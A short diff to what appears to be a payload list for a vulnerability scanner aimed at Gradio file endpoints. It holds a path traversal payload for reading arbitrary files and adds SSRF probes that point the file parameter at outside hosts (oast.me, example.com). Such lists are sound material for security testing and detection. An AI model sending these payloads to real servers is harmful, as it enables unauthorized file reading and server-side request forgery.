@@ -1,2 +1,4 @@
 /file/../../../../../../../../../../../../../../../../../..{{path}}
 /ui/gradio_api/file=https://oast.me
+/gradio_api/file=http://example.com
+/file=http://example.com
